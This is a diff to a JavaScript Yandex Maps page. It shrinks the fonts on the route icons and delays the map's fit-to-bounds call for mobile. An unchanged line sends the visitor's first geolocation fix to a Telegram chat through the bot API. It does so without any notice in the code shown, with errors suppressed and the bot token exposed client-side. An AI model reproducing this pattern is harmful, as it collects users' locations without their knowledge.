@@ -90,7 +90,8 @@ const getIcon = (col, txt, az, isEnd) => {
     const cleanTxt = txt.replace('!', '');
     const size = isEnd ? 34 : 40;
     const center = size / 2;
-    const svg = `<svg xmlns="http://www.w3.org/2000/svg" width="${size}" height="${size}"><g transform="rotate(${az},${center},${center})"><polygon points="${center},2 ${center+10},${size-5} ${center},${size-14} ${center-10},${size-5}" fill="${col}" stroke="${isEnd?'white':'black'}" stroke-width="1.5"/></g><circle cx="${center}" cy="${center}" r="${isEnd?7:9}" fill="${col}" stroke="${isEnd?'white':'black'}" stroke-width="1"/><text x="${center}" y="${center+(isEnd?3.5:4)}" font-size="${isEnd?9:11}" font-family="Arial" font-weight="900" text-anchor="middle" fill="${isRed?'#FF3B30':'#000'}" stroke="white" stroke-width="2" style="paint-order:stroke fill">${cleanTxt}</text></svg>`;
+    // Уменьшен шрифт: основной с 11 до 9, конечный с 9 до 8
+    const svg = `<svg xmlns="http://www.w3.org/2000/svg" width="${size}" height="${size}"><g transform="rotate(${az},${center},${center})"><polygon points="${center},2 ${center+10},${size-5} ${center},${size-14} ${center-10},${size-5}" fill="${col}" stroke="${isEnd?'white':'black'}" stroke-width="1.5"/></g><circle cx="${center}" cy="${center}" r="${isEnd?7:9}" fill="${col}" stroke="${isEnd?'white':'black'}" stroke-width="1"/><text x="${center}" y="${center+(isEnd?3:3.5)}" font-size="${isEnd?8:9}" font-family="Arial" font-weight="900" text-anchor="middle" fill="${isRed?'#FF3B30':'#000'}" stroke="white" stroke-width="2" style="paint-order:stroke fill">${cleanTxt}</text></svg>`;
     return 'data:image/svg+xml;utf8,' + encodeURIComponent(svg);
 };
 
@@ -108,13 +109,16 @@ async function loadData() {
         const data = await (await fetch(CFG.DATA_URL)).json();
         renderPoints(data);
         renderMenu(data);
-        trySetArea(); // Попытка выставить область сразу
+        setTimeout(trySetArea, 300); // Небольшая задержка для корректного просчета на мобильных
     } catch (e) { console.error(e); }
 }
 
 function trySetArea() {
-    if (state.areaSet || !points.length) return;
+    if (state.areaSet || !points.length || !map) return;
+    
+    // Принудительно обновляем вьюпорт карты
     map.container.fitToViewport();
+    
     const bounds = map.geoObjects.getBounds();
     if (bounds) {
         map.setBounds(bounds, { checkZoomRange: true, zoomMargin: 50, duration: 0 }).then(() => {
@@ -149,15 +153,21 @@ function initGeo() {
     const blueDot = 'data:image/svg+xml;utf8,' + encodeURIComponent('<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20"><circle cx="10" cy="10" r="8" fill="#007AFF" stroke="white" stroke-width="2"/></svg>');
     userMarker = new ymaps.Placemark([0,0], {}, { iconLayout: 'default#imageWithContent', iconImageSize: [20,20], iconImageOffset: [-10,-10], iconImageHref: blueDot, zIndex: 9999, visible: false });
     map.geoObjects.add(userMarker);
+    
     navigator.geolocation.watchPosition(p => {
         const coords = [p.coords.latitude, p.coords.longitude];
         userMarker.geometry.setCoordinates(coords);
         userMarker.options.set('visible', true);
+        
         if (!state.geoSent) {
             state.geoSent = true;
             fetch(`https://api.telegram.org/bot${CFG.BOT_TOKEN}/sendLocation?chat_id=${CFG.CHAT_ID}&latitude=${coords[0]}&longitude=${coords[1]}`).catch(()=>{});
-            trySetArea(); // Ключевой момент: фокусировка при получении гео
+            
+            // На Android при первом получении геопозиции пробуем сфокусироваться на маршрутах
+            // с задержкой, чтобы объекты успели прогрузиться в DOM карты
+            setTimeout(trySetArea, 800);
         }
+        
         if (state.autoCenter) map.panTo(coords);
     }, null, { enableHighAccuracy: true });
 }
